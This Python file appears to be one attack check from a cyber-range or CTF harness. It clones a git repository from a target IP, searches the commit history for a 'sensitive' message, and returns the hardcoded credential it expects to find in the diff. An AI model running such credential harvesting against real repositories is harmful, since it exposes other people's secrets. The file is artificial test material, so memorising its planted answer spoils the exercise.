from core.test_structs import AttackResult
import tempfile
import subprocess

# initial access measure #1
# git clone repository at http://<target_ip>/git/forge-logs.git
# check git logs for commit message containing "sensitive"
# check commit diff for presence of "h1ewFWZG"

# this test should ideally use pygit2 but its fine
def forge_git_initial_access_via_git(target_ip: str) -> AttackResult:

    repo_url = f"http://{target_ip}/git/forge-logs.git"
    sensitive_keyword = "sensitive"
    credential_keyword = "h1ewFWZG"

    try:
        with tempfile.TemporaryDirectory() as tmpdirname:
            # git clone repository at http://<target_ip>/git/forge-logs.git
            subprocess.run(['git', 'clone', repo_url, tmpdirname], check=True, capture_output=True)
            
            # check git logs for commit message containing "sensitive" and diff for "h1ewFWZG"
            result = subprocess.run(
                ['git', 'log', '-p'],
                cwd=tmpdirname,
                capture_output=True,
                text=True,
                check=True
            )
            
            log_output = result.stdout
            commits = log_output.split('commit ')
            
            for commit_block in commits:
                # Check if this commit has "sensitive" in the message
                if sensitive_keyword in commit_block:
                    # Check if the credential keyword is in the patch/diff
                    if credential_keyword in commit_block:
                        return AttackResult(
                            success=True,
                            message=f"Found credentials in commit with '{sensitive_keyword}': {credential_keyword}",
                            data=credential_keyword
                        )

        return AttackResult(success=False, message="No sensitive credentials found in git logs.")
    except Exception as e:
        error_msg = f"Exception: {type(e).__name__}: {str(e)}"
        return AttackResult(success=False, message=error_msg)